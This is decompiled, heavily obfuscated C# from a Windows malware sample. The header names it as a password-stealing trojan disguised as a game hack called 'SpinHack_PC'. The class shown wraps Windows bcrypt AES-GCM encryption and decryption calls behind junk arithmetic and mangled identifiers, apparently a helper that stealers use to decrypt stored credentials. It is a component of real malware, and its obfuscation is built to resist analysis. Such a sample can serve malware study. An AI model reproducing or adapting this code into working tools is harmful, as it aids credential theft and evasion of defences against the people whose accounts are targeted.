// Decompiled with JetBrains decompiler
// Type: BE7C0963
// Assembly: SpinHack_PC, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 65E7A0C4-9AD9-4435-B85F-DA409F1EDFB9
// Assembly location: C:\Users\Administrateur\Downloads\ransomware_new\HEUR-Trojan-PSW.MSIL.Growtopia.gen-6e6f85f9f7933c4446076b2de915fc2fbc76ca58137fe993addedeabb4392347.exe

using System;
using System.Runtime.InteropServices;

public static class BE7C0963
{
  public const uint C3AEDF51 = 0;
  public const uint \u0031DF7B68B9 = 8;
  public const uint \u0032998C3C45 = 4;
  public static readonly byte[] \u003151F36882;
  public static readonly string \u0034DE934D12;
  public static readonly string \u0031B73C85E4;
  public static readonly string \u0034DCAB53F7;
  public static readonly string \u0031E8C0BB91;
  public static readonly string \u0033BAB7F812;
  public static readonly string \u003188730087;
  public static readonly string \u0034C008A43D;
  public static readonly int \u00355CFCC9C8;
  public static readonly int \u0032C7F1F196;
  public static readonly uint \u0033019009F7;

  [DllImport("bcrypt.dll", EntryPoint = "BCryptOpenAlgorithmProvider")]
  public static extern uint \u003327143C7D(
    out IntPtr _param0,
    [MarshalAs(UnmanagedType.LPWStr)] string _param1,
    [MarshalAs(UnmanagedType.LPWStr)] string _param2,
    uint _param3);

  [DllImport("bcrypt.dll", EntryPoint = "BCryptCloseAlgorithmProvider")]
  public static extern uint \u00344365DB4A(IntPtr _param0, uint _param1);

  [DllImport("bcrypt.dll", EntryPoint = "BCryptGetProperty")]
  public static extern uint \u00338E7CC68F(
    IntPtr _param0,
    [MarshalAs(UnmanagedType.LPWStr)] string _param1,
    byte[] _param2,
    int _param3,
    ref int _param4,
    uint _param5);

  [DllImport("bcrypt.dll", EntryPoint = "BCryptSetProperty")]
  internal static extern uint \u00314CD6C0CF(
    IntPtr _param0,
    [MarshalAs(UnmanagedType.LPWStr)] string _param1,
    byte[] _param2,
    int _param3,
    int _param4);

  [DllImport("bcrypt.dll", EntryPoint = "BCryptImportKey")]
  public static extern uint \u0034EDD315EE(
    IntPtr _param0,
    IntPtr _param1,
    [MarshalAs(UnmanagedType.LPWStr)] string _param2,
    out IntPtr _param3,
    IntPtr _param4,
    int _param5,
    byte[] _param6,
    int _param7,
    uint _param8);

  [DllImport("bcrypt.dll", EntryPoint = "BCryptDestroyKey")]
  public static extern uint \u003207C562AD(IntPtr _param0);

  [DllImport("bcrypt.dll", EntryPoint = "BCryptEncrypt")]
  public static extern uint \u0034D3DFFF67(
    IntPtr _param0,
    byte[] _param1,
    int _param2,
    ref BE7C0963.\u00315C59145D _param3,
    byte[] _param4,
    int _param5,
    byte[] _param6,
    int _param7,
    ref int _param8,
    uint _param9);

  [DllImport("bcrypt.dll", EntryPoint = "BCryptDecrypt")]
  internal static extern uint B88CAA7C(
    IntPtr _param0,
    byte[] _param1,
    int _param2,
    ref BE7C0963.\u00315C59145D _param3,
    byte[] A9D1F704,
    int _param5,
    byte[] _param6,
    int _param7,
    ref int _param8,
    int _param9);

  static BE7C0963()
  {
label_0:
    uint num1;
    do
    {
      uint num2 = 1524386861;
      int num3 = (int) num2 ^ 396232806;
      uint num4 = num2 ^ 755192969U;
      BE7C0963.\u003151F36882 = \u00332E2794B.\u00373E46A8E(num3);
      do
      {
        do
        {
          num4 &= 1325795542U;
          BE7C0963.\u0034DE934D12 = "ObjectLength";
        }
        while (num4 < 84481125U);
        BE7C0963.\u0031B73C85E4 = "ChainingModeGCM";
        BE7C0963.\u0034DCAB53F7 = "AuthTagLength";
        BE7C0963.\u0031E8C0BB91 = "ChainingMode";
        uint num5 = (775692901U - num4) * 1765175883U;
        BE7C0963.\u0033BAB7F812 = "KeyDataBlob";
        num4 = 1845974927U / num5;
        if (num4 < 506675240U)
          BE7C0963.\u003188730087 = "AES";
        else
          goto label_0;
      }
      while (1057121851U >> (int) num4 == 0U);
      uint num6 = num4 << 30;
      BE7C0963.\u0034C008A43D = "Microsoft Primitive Provider";
      BE7C0963.\u00355CFCC9C8 = (int) num6 ^ 1;
      uint num7 = 1055422620U >> (int) num6;
      BE7C0963.\u0032C7F1F196 = (int) num7 - 1055422619;
      uint num8 = 386167870U + num7;
      int num9 = (int) num8 + 1779675944;
      num1 = 1253070161U ^ num8;
      BE7C0963.\u0033019009F7 = (uint) num9;
    }
    while (num1 == 1030446704U);
  }

  public struct \u003177A3F77E
  {
    [MarshalAs(UnmanagedType.LPWStr)]
    public string \u003528BDE3CB;
    public int \u0033CB395F4C;

    public \u003177A3F77E(string _param1, int _param2)
    {
      uint num1;
      do
      {
        num1 = 91585697U;
        if (((int) num1 & 289884279) != 0)
        {
          uint num2 = num1 + 280387860U;
          string str = _param1;
          uint num3 = 871176379U ^ num2;
          this.\u003528BDE3CB = str;
          num1 = num3 ^ 686635641U;
        }
        else
          break;
      }
      while ((1445662577 ^ (int) num1) == 0);
      uint num4 = 787100709U % num1;
      int num5 = _param2;
      uint num6 = num4 % 320755739U;
      this.\u0033CB395F4C = num5;
    }
  }

  public struct \u00315C59145D : IDisposable
  {
    public int \u00310403F6B0;
    public int \u0032FB056770;
    public IntPtr \u0034C0F189AD;
    public int \u003378D3A085;
    public IntPtr \u00307E26F21;
    public int \u0033DDDA3335;
    public IntPtr \u00355D6BB0F1;
    public int A25357F0;
    public IntPtr \u0031C7016424;
    public int \u0033E87752A6;
    public int \u0031311CF685;
    public long \u003101CE5BC4;
    public int \u00349DFBAB01;

    public unsafe \u00315C59145D(byte[] _param1, byte[] _param2, byte[] _param3)
    {
label_0:
      *(BE7C0963.\u00315C59145D*) ref this = new BE7C0963.\u00315C59145D();
label_1:
      uint num1;
      do
      {
        uint num2 = 2043358110;
        bool flag;
        uint num3;
        do
        {
          uint num4 = 1936803911U - num2;
          this.\u0032FB056770 = BE7C0963.\u0032C7F1F196;
          if (1753169779U > num4)
            goto label_4;
label_3:
          uint num5 = num4 << 8;
          // ISSUE: type reference
          int num6 = \u003573563D6.\u0035FB50EC4(\u00361875A8B.\u00338D650E1(__typeref (BE7C0963.\u00315C59145D)));
          uint num7 = 454164560U | num5;
          this.\u00310403F6B0 = num6;
          num4 = 405299585U ^ num7;
          flag = _param1 == null;
label_4:
          if (!flag)
          {
            uint num8 = 313867561U & num4 + 1016282665U;
            int length = _param1.Length;
            uint num9 = num8 | 658991421U;
            int num10 = length;
            uint num11 = num9 + 1178218239U;
            this.\u003378D3A085 = num10;
            num4 = num11 / 766453348U;
            if (1344088155U > num4)
            {
              uint num12 = 380789285U ^ num4;
              int num13 = this.\u003378D3A085;
              uint num14 = 1213621063U - num12;
              this.\u0034C0F189AD = \u00324CB1815.\u003617A4D6F(num13);
              uint num15 = num14 / 1759525585U;
              if (57486413 * (int) num15 == 0)
              {
                byte[] numArray = _param1;
                uint num16 = num15 & 155912424U;
                int num17 = (int) num16 + 0;
                uint num18 = 2059348065U * (928782390U ^ num16);
                IntPtr num19 = this.\u0034C0F189AD;
                uint num20 = 405359426U << (int) num18;
                int num21 = this.\u003378D3A085;
                \u0032E462EF5.\u00379E40811(numArray, num17, num19, num21);
                uint num22 = num20 >> 28;
                if (109926926U / num22 != 0U)
                  num4 = num22 + 454107891U ^ 3156732881U;
                else
                  goto label_0;
              }
              else
                goto label_0;
            }
            else
              goto label_3;
          }
          uint num23 = 1488091210U * num4;
          byte[] numArray1 = _param2;
          uint num24 = 1364811551U & num23;
          int num25 = numArray1 == null ? 1 : 0;
          uint num26 = 511592862U * num24;
          flag = num25 != 0;
          num3 = 1924029782U - num26;
          if (1134428324U < num3)
          {
            if (!flag)
            {
              uint num27 = 1161050016U & num3;
              int length = _param2.Length;
              uint num28 = 273627958U + num27;
              this.\u0033DDDA3335 = length;
              uint num29 = 834019308U ^ num28;
              int num30 = this.\u0033DDDA3335;
              uint num31 = 294330348U - num29;
              this.\u00307E26F21 = \u00324CB1815.\u003617A4D6F(num30);
              uint num32 = num31 << 1;
              if ((956048861 ^ (int) num32) != 0)
              {
                byte[] numArray2 = _param2;
                uint num33 = 1253772551U * num32;
                int num34 = (int) num33 ^ -1572235588;
                uint num35 = 783251113U + num33;
                IntPtr num36 = this.\u00307E26F21;
                int num37 = this.\u0033DDDA3335;
                \u0032E462EF5.\u00379E40811(numArray2, num34, num36, num37);
                num2 = 1804801563U + num35;
                if ((int) num2 << 25 != 0)
                  goto label_1;
              }
              else
                goto label_0;
            }
            else
              goto label_15;
          }
          else
            goto label_0;
        }
        while ((2019625659 ^ (int) num2) == 0);
        num3 = num2 ^ 2862950058U;
label_15:
        if ((601433882 & (int) num3) != 0)
        {
          byte[] numArray3 = _param3;
          num1 = num3 + 1000103565U | 1109269285U;
          flag = numArray3 == null;
          if (!flag)
          {
            uint num38 = num1 >> 20 << 17;
            int length1 = _param3.Length;
            uint num39 = num38 ^ 1106124134U;
            int num40 = length1;
            uint num41 = num39 * 611217332U;
            this.A25357F0 = num40;
            uint num42 = (2074221834U << (int) num41) / 717909715U;
            IntPtr num43 = \u00324CB1815.\u003617A4D6F(this.A25357F0);
            uint num44 = 4005666U + num42;
            this.\u00355D6BB0F1 = num43;
            byte[] numArray4 = _param3;
            uint num45 = 1107981023U * num44;
            int num46 = (int) num45 - 1752122014;
            IntPtr num47 = this.\u00355D6BB0F1;
            uint num48 = num45 ^ 3234679U;
            int a25357F0 = this.A25357F0;
            \u0032E462EF5.\u00379E40811(numArray4, num46, num47, a25357F0);
            uint num49 = (num48 | 203187965U) / 4876346U;
            int length2 = _param3.Length;
            uint num50 = 1940858562U ^ num49;
            this.\u0033E87752A6 = length2;
            uint num51 = num50 | 461858132U;
            if (num51 >= 1053117917U)
            {
              uint num52 = 1994146390U + num51;
              this.\u0031C7016424 = \u00324CB1815.\u003617A4D6F(this.\u0033E87752A6);
              num1 = num52 ^ 559206907U;
            }
            else
              goto label_0;
          }
        }
        else
          goto label_0;
      }
      while (1780105706U == 311321649U >> (int) num1);
    }

    public void Dispose()
    {
label_0:
      uint num1;
      do
      {
        uint num2;
        do
        {
          uint num3 = 683824932;
          int num4 = \u00372482622.\u0035E884066(this.\u0034C0F189AD, IntPtr.Zero) ? 1 : 0;
          int num5 = (int) num3 - 683824932;
          uint num6 = 359675940U - num3;
          bool flag = num4 == num5;
          uint num7 = num6 * 198402986U;
label_2:
          int num8 = flag ? 1 : 0;
          uint num9 = 1920999054U ^ num7;
          if (num8 != 0 || ((int) num9 ^ 1596334230) == 0)
            goto label_5;
label_3:
          IntPtr num10 = this.\u0034C0F189AD;
          uint num11 = 1493462995U - num9;
          \u0034F262A20.\u0031C445D8D(num10);
          num7 = 1155282500U << (int) num11;
          if (338107136U <= num7)
            num9 = num7 ^ 897367054U;
          else
            goto label_2;
label_5:
          num7 = 8216386U << (int) num9;
          if ((int) num7 + 2069771089 != 0)
          {
            uint num12 = num7 & 1638756876U;
            IntPtr num13 = this.\u00355D6BB0F1;
            uint num14 = 617355529U % num12;
            IntPtr zero1 = IntPtr.Zero;
            uint num15 = 1919580667U | num14;
            if ((\u00372482622.\u0035E884066(num13, zero1) ? 1 : 0) != ((int) num15 ^ 1995340283))
            {
              uint num16 = num15 / 3745181U;
              if (num16 <= 1497108278U)
              {
                uint num17 = 105784423U - num16;
                IntPtr num18 = this.\u00355D6BB0F1;
                uint num19 = num17 / 184027700U;
                \u0034F262A20.\u0031C445D8D(num18);
                num15 = num19 + 1995340283U;
              }
              else
                goto label_0;
            }
            uint num20 = 1107320119U >> (int) (1497595192U ^ num15);
            IntPtr num21 = this.\u00307E26F21;
            uint num22 = 909589740U ^ num20;
            IntPtr zero2 = IntPtr.Zero;
            int num23 = \u00372482622.\u0035E884066(num21, zero2) ? 1 : 0;
            uint num24 = 1618764254U ^ num22;
            int num25 = (int) num24 - 1577801364;
            int num26 = num23 == num25 ? 1 : 0;
            uint num27 = num24 - 1151816843U;
            flag = num26 != 0;
            num2 = num27 ^ 66284905U;
            if (!flag)
            {
              num9 = num2 << 11;
              if (num9 >= 2107140291U)
              {
                uint num28 = 1166951458U >> (int) num9;
                IntPtr num29 = this.\u00307E26F21;
                uint num30 = 1886269384U & num28;
                \u0034F262A20.\u0031C445D8D(num29);
                num9 = 634925459U ^ num30;
                if (1525109790U < num9)
                  num2 = num9 ^ 2134989555U;
                else
                  goto label_3;
              }
              else
                goto label_3;
            }
          }
          else
            goto label_2;
        }
        while ((int) num2 << 27 != 0);
        IntPtr num31 = this.\u0031C7016424;
        uint num32 = 446038746U % num2;
        IntPtr zero = IntPtr.Zero;
        uint num33 = 1266746407U - num32;
        bool flag1 = (\u00372482622.\u0035E884066(num31, zero) ? 1 : 0) == ((int) num33 ^ 820707661);
        uint num34 = 1960736317U / num33;
        int num35 = flag1 ? 1 : 0;
        num1 = num34 / 1964527544U;
        if (num35 == 0)
        {
          uint num36 = 878579080U / (265814504U - num1);
          \u0034F262A20.\u0031C445D8D(this.\u0031C7016424);
          uint num37 = 1752196895U ^ num36;
          if (1938517281U != num37)
            num1 = num37 + 2542770404U;
          else
            goto label_0;
        }
      }
      while (num1 == 1724450275U);
    }
  }

  public struct \u0033525B7172
  {
    public int \u0032E786C534;
    public int \u00326386A286;
    public int \u00397C14F9D;
  }

  public struct \u0035B5258B0
  {
    [MarshalAs(UnmanagedType.LPWStr)]
    public string \u0031F076CE3A;
    public IntPtr \u003530E2DD9D;
    public int \u0032838A5D4D;

    public \u0035B5258B0(string _param1)
    {
      uint num1 = 873990937;
      if (772150938U != num1)
      {
        string str = _param1;
        uint num2 = 785268188U ^ num1;
        this.\u0031F076CE3A = str;
        uint num3 = 959862708U << (int) num2;
        IntPtr zero = IntPtr.Zero;
        num1 = 2070290588U - num3;
        this.\u003530E2DD9D = zero;
      }
      this.\u0032838A5D4D = (int) num1 ^ 1419455004;
    }
  }
}
